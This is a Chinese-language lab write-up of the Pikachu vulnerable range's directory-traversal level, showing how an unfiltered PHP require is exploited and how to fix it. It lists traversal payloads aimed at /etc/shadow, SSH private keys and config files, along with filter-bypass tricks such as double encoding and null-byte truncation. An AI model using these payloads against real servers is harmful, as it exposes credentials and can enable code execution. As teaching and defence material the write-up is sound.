# 目录遍历 通关笔记

> 页面给了两篇小短文，点链接就能看。
>
> 但链接的参数是文件名，而且服务端用的是 `require`——**`../` 一加，整台服务器的文件都能被"引用"。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | 目录遍历 → ../../ |
| 页面地址 | `http://pikachu/vul/dir/dir_list.php` |
| 提交方式 | GET |
| 参数名 | `title` |
| 目标 | 通过路径穿越读取/执行服务器上的任意文件 |

---

## 二、我的解题步骤

### 步骤 1：先正常点一次

页面上有两个链接：

```html
<a class="dt_title" href="dir_list.php?title=jarheads.php">we're jarheads!</a>
<a class="dt_title" href="dir_list.php?title=truman.php">Truman's word!</a>
```

点第一个，URL 变成：

```
dir_list.php?title=jarheads.php
```

页面显示了一篇小短文。

**参数 `title` 就是文件名。**

### 步骤 2：看源码

```php
$html='';
if(isset($_GET['title'])){
    $filename=$_GET['title'];
    //这里直接把传进来的内容进行了require(),造成问题
    require "soup/$filename";
}
```

**`require "soup/$filename"` —— 直接拼接，没有任何过滤。**

作者自己都注释了：「这里直接把传进来的内容进行了 require()，造成问题」。

### 步骤 3：算路径层数

前缀是 `soup/`，脚本在 `D:\Pikachu\vul\dir\`。

```
D:\Pikachu\vul\dir\soup\      ← 拼接后的前缀
D:\Pikachu\vul\dir\           ← 上一层
D:\Pikachu\vul\               ← 上两层
D:\Pikachu\                   ← 上三层
```

所以要跳三层：

```
../../../README.md
```

### 步骤 4：读一个文本文件

```
dir_list.php?title=../../../README.md
```

我实测：

| payload | 返回长度 | 内容 |
| --- | --- | --- |
| `jarheads.php` | 34297 | 正常短文 |
| `../../../README.md` | **35559** | **README 全文** |

**文件内容被整篇输出到了页面上。**

### 步骤 5：试一个 PHP 文件

```
dir_list.php?title=../../inc/config.inc.php
```

返回长度 30845，但**页面上看不到 `DBPW`**。

因为 `require` 会**执行** PHP 文件——`config.inc.php` 里的代码被执行了（定义了常量），但 PHP 代码本身不输出。

**"页面空白"不代表失败，可能是执行了。**

### 步骤 6：为什么这一关比"文件包含"更狠

因为用的是 **`require`**，不是 `readfile`。

`require` 会把目标文件当 **PHP 代码执行**。

如果能把一个"含 PHP 代码的文件"喂进去，就是 RCE。

## 三、原理分析

### 3.1 源码

```php
if(isset($_GET['title'])){
    $filename=$_GET['title'];
    //这里直接把传进来的内容进行了require(),造成问题
    require "soup/$filename";
}
```

### 3.2 为什么 `../` 能跳出去

`require` 的参数是**文件系统路径**，`../` 在路径解析里表示"上一级"。

```
soup/../../../README.md
     ↑↑↑
  跳三层
```

**`require` 不会检查"这个文件是不是必须在 soup 目录下"。**

### 3.3 `require` 和 `include` 的区别

| | `include` | `require` |
| --- | --- | --- |
| 文件不存在 | 警告，继续执行 | **致命错误，停止** |
| 执行 PHP 代码 | ✅ | ✅ |
| 常见用途 | 模板片段 | 核心依赖 |

**两者都会"执行"文件内容——所以都有 RCE 潜力。**

### 3.4 目录遍历 vs 文件包含

很多人把这两个混在一起。区别在于**"对文件做什么"**：

| | 目录遍历 | 文件包含 |
| --- | --- | --- |
| 典型函数 | `readfile`、`file_get_contents` | `include`、`require` |
| 对文件做什么 | **读内容** | **执行代码** |
| 能否 RCE | 不能（除非配合） | **能** |
| 本关 | 其实用的是 `require` | ✅ 属于文件包含的一种 |

**这一关"不纯粹"——名字叫目录遍历，代码是 `require`，所以两个特征都有。**

## 四、知识点与笔记

### 4.1 目录遍历（路径穿越）是什么

> **用户输入的路径里带 `../`，跳出预期目录，访问到上级目录的文件。**

```php
// 本意：只读 soup 目录下的文件
require "soup/$filename";

// 实际：$filename = ../../../etc/passwd
require "soup/../../../etc/passwd";
```

### 4.2 常见 payload

| 目标（Linux） | payload |
| --- | --- |
| 系统用户 | `../../../../etc/passwd` |
| 系统密码 | `../../../../etc/shadow` |
| 进程环境 | `../../../../proc/self/environ` |
| SSH 密钥 | `../../../../root/.ssh/id_rsa` |
| 日志 | `../../../../var/log/apache2/access.log` |

| 目标（Windows） | payload |
| --- | --- |
| 系统配置 | `..\..\..\..\windows\win.ini` |
| hosts | `..\..\..\..\windows\system32\drivers\etc\hosts` |
| 站点配置 | `../../inc/config.inc.php` |

### 4.3 层数怎么数

**从"拼接后的真实位置"往上数。**

这一关：

```
soup/ + ../../../  →  D:\Pikachu\
```

- `soup/..` → `dir/`
- `../..` → `vul/`
- `../../..` → `Pikachu/`

**多一层少一层都不行——`require` 找不到文件会直接报致命错误。**

### 4.4 常见绕过（当有过滤时）

| 过滤 | 绕过 |
| --- | --- |
| 去掉 `../` | `....//`、`..././` |
| 去掉 `../` | `..%2f`、`..%252f`（二次编码） |
| 只允许某后缀 | `%00` 截断（PHP < 5.3.4） |
| 检查绝对路径 | `..%5c`（Windows 反斜杠） |

**本关没有过滤，所以不需要绕。**

### 4.5 怎么判断"读成功"还是"执行了"

| 现象 | 说明 |
| --- | --- |
| 页面出现文件文本 | 读成功了（文本文件） |
| 页面空白 / 只有框架 | 可能是 PHP 被执行了 |
| 报致命错误 | 路径不对 / 文件不存在 |

**`require` 失败会直接 fatal error，页面会明显异常。**

## 五、和其他几关的区别

| 关卡 | 函数 | 参数 | 效果 |
| --- | --- | --- | --- |
| 文件包含 local | `include "include/$filename"` | `filename` | 执行 |
| 文件包含 remote | `include "$filename"` | `filename` | 执行（可远程） |
| **目录遍历** | **`require "soup/$filename"`** | `title` | **执行 + 穿越** |
| 文件下载 | `readfile` | `filename` | 只读 |

**四关都在"操作文件"，区别在函数和有没有前缀。**

## 六、防御怎么写

### 6.1 白名单（最简单）

```php
$allow = ['jarheads.php', 'truman.php'];

if (!in_array($filename, $allow, true)) {
    exit('非法文件');
}
require "soup/" . $filename;
```

### 6.2 ID 映射（推荐）

```php
$map = [
    '1' => 'jarheads.php',
    '2' => 'truman.php',
];

$page = $map[$_GET['id'] ?? ''] ?? null;
if (!$page) exit('非法参数');

require "soup/" . $page;
```

**用户只能传 `1` `2`，路径完全不可控。**

### 6.3 限制目录（realpath）

```php
$base = realpath('soup');
$target = realpath($base . '/' . $filename);

if ($target === false || strpos($target, $base) !== 0) {
    exit('非法路径');
}
require $target;
```

**`realpath` 会把 `../` 解析掉，再判断是否还在允许目录内。**

### 6.4 不要用 `require` 加载用户指定的文件

**能用"数据"解决的，就别用"代码"。**

比如把文章存进数据库，用 ID 查询——而不是用文件路径。

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 路径穿越 + `require` 执行 |
| 关键代码 | `require "soup/$filename"` |
| payload | `?title=../../../README.md` |
| 实测 | README 全文输出（35559 字节） |
| 层数 | `soup/` 往上跳 3 层到站点根 |
| 修复 | 白名单 / ID 映射 / `realpath` |

**一句话**：

> **`require` 后面的路径一旦可控，`../` 就是通往整台服务器的楼梯——而且它还会"执行"。**
